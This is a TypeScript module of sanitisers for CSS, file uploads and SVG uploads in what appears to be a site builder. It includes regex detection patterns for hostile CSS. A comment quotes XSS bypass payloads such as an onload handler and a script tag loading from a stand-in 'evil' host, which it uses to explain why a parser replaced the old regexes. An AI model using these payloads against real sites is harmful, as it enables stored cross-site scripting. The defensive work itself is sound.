import sanitizeHtmlLib from "sanitize-html";

// ---------------------------------------------------------------------------
// HTML / CSS sanitisation
// ---------------------------------------------------------------------------

/**
 * Sanitize CSS — strip anything that could exfiltrate data or execute code.
 * Removes: url(), @import, expression(), javascript:, behavior, -moz-binding
 */
export function sanitizeCss(css: string): string {
  return css
    // Remove @import rules (data exfiltration)
    .replace(/@import\b[^;]*;?/gi, "/* @import removed */")
    // Remove url() calls (data exfiltration via background-image etc.)
    .replace(/url\s*\([^)]*\)/gi, "/* url() removed */")
    // Remove expression() (IE script execution)
    .replace(/expression\s*\([^)]*\)/gi, "/* expression() removed */")
    // Remove javascript: protocol
    .replace(/javascript\s*:/gi, "/* javascript: removed */")
    // Remove behavior (IE HTCs)
    .replace(/behavior\s*:/gi, "/* behavior removed */")
    // Remove -moz-binding (Firefox XBL)
    .replace(/-moz-binding\s*:/gi, "/* -moz-binding removed */");
}

/**
 * Validate CSS custom property values to prevent injection.
 * Only allows safe characters for font-family, colors, and CSS units.
 */
export function sanitizeCssValue(value: string): string {
  // Allow: alphanumeric, spaces, commas, hashes, dots, parens, %, px, rem, em,
  //        single quotes, hyphens, underscores
  return value.replace(/[^a-zA-Z0-9\s,#.()%'"_-]/g, "");
}

// ---------------------------------------------------------------------------
// File Upload Validation
// ---------------------------------------------------------------------------

const ALLOWED_EXTENSIONS = new Set([
  "jpg",
  "jpeg",
  "png",
  "gif",
  "webp",
  "avif",
  "svg",
  "ico",
  "mp4",
  "webm",
  "ogg",
  "mp3",
  "wav",
  "pdf",
  "woff",
  "woff2",
  "ttf",
  "otf",
]);

// SVG can contain scripts — strip them if accepted
const DANGEROUS_EXTENSIONS = new Set(["svg"]);

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

export function validateUploadFile(
  filename: string,
  size: number
): { valid: true; ext: string } | { valid: false; error: string } {
  if (size > MAX_FILE_SIZE) {
    return { valid: false, error: `File too large. Max ${MAX_FILE_SIZE / 1024 / 1024}MB.` };
  }

  const ext = filename.split(".").pop()?.toLowerCase() ?? "";
  if (!ext || !ALLOWED_EXTENSIONS.has(ext)) {
    return {
      valid: false,
      error: `File type .${ext} is not allowed. Allowed: ${Array.from(ALLOWED_EXTENSIONS).join(", ")}`,
    };
  }

  return { valid: true, ext };
}

export function isDangerousExtension(ext: string): boolean {
  return DANGEROUS_EXTENSIONS.has(ext.toLowerCase());
}

/**
 * SVG elements that draw something.
 *
 * An allowlist, because the danger in SVG is not one tag: <script> runs
 * JavaScript, <foreignObject> embeds HTML, <style> brings CSS, <use> pulls in
 * an external document, and the SMIL elements (<animate>, <set>) can point an
 * attribute at a javascript: URL after the file has loaded. None of them are
 * needed to draw a picture, so none of them are here.
 */
const SVG_TAGS = [
  "svg", "g", "defs", "symbol", "title", "desc", "metadata", "a",
  "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
  "text", "tspan", "textPath", "image",
  "linearGradient", "radialGradient", "stop", "pattern",
  "clipPath", "mask", "marker", "switch",
  "filter", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite",
  "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDropShadow",
  "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur",
  "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset",
  "feSpecularLighting", "feTile", "feTurbulence",
];

/** Attributes that carry a URL, and so have to be looked at. */
const URL_ATTRS = /^(?:href|src|xlink:href)$/i;

/**
 * A `style` attribute, with the parts that reach off the file taken out.
 *
 * CSS in an attribute cannot run script in any browser still shipping, but it
 * can still fetch: `background-image: url(https://…)` turns opening a picture
 * into a call to whoever made it. A reference inside the same file — which is
 * how a gradient or a clip path is named — is left alone.
 */
function sanitizeSvgStyle(value: string): string {
  return value
    .replace(/@import\b[^;]*;?/gi, "")
    .replace(/expression\s*\(/gi, "")
    .replace(/url\s*\(\s*(['"]?)(?!#)[^)]*\1\s*\)/gi, "");
}

/** A URL an uploaded picture may point at. Anything else is dropped. */
function safeSvgUrl(value: string): boolean {
  const v = value.trim();
  // A reference inside the same file, or a path — neither can name a scheme.
  if (v.startsWith("#") || v.startsWith("/") || v.startsWith("./") || v.startsWith("../")) return true;
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(v)?.[1]?.toLowerCase();
  if (!scheme) return true;
  if (scheme === "http" || scheme === "https") return true;
  // A picture inlined in the file, but not a document: data:text/html carries
  // markup, and markup carries script.
  return scheme === "data" && /^data:image\/(?:png|jpeg|gif|webp);/i.test(v);
}

/**
 * Strip the ways an uploaded SVG can run code.
 *
 * This used to be a list of regular expressions over the raw text, and text is
 * the one thing an attacker controls the shape of. Every one of these went
 * through it untouched:
 *
 *   <svg onload=alert(1)>                  — the pattern wanted quotes
 *   <svg onload\n=\nalert(1)>              — and no newlines
 *   <svg><script src="https://evil/x.js">  — and a closing tag to match
 *
 * Uploads are served from this origin, so that was stored XSS in the builder's
 * own window. A parser does not have that class of hole: it reads the markup
 * the way a browser does, decodes the entities, and hands back tags and
 * attributes that have already been resolved — so there is nothing left to
 * hide a handler inside.
 */
export function sanitizeSvg(content: string): string {
  return sanitizeHtmlLib(content, {
    allowedTags: SVG_TAGS,
    // Every attribute is kept except the ones ruled out below. An allowlist
    // here would have to name every presentation attribute SVG has, and the
    // one it forgot would quietly break somebody's picture.
    allowedAttributes: false,
    disallowedTagsMode: "discard",
    // SVG is case-sensitive: `viewBox` lower-cased is not `viewBox` any more,
    // and the picture loses its scaling when the file is read as XML.
    parser: { lowerCaseTags: false, lowerCaseAttributeNames: false },
    transformTags: {
      "*": (tagName: string, attribs: Record<string, string>) => {
        const kept: Record<string, string> = {};
        for (const [name, value] of Object.entries(attribs)) {
          // Event handlers, whatever they are called and however they were
          // written in the file.
          if (/^on/i.test(name)) continue;
          if (URL_ATTRS.test(name) && !safeSvgUrl(value)) continue;
          kept[name] = name.toLowerCase() === "style" ? sanitizeSvgStyle(value) : value;
        }
        return { tagName, attribs: kept };
      },
    },
  });
}

/** True once a sanitized upload still has a picture in it. */
export function isRenderableSvg(content: string): boolean {
  return /<svg[\s>]/i.test(content);
}
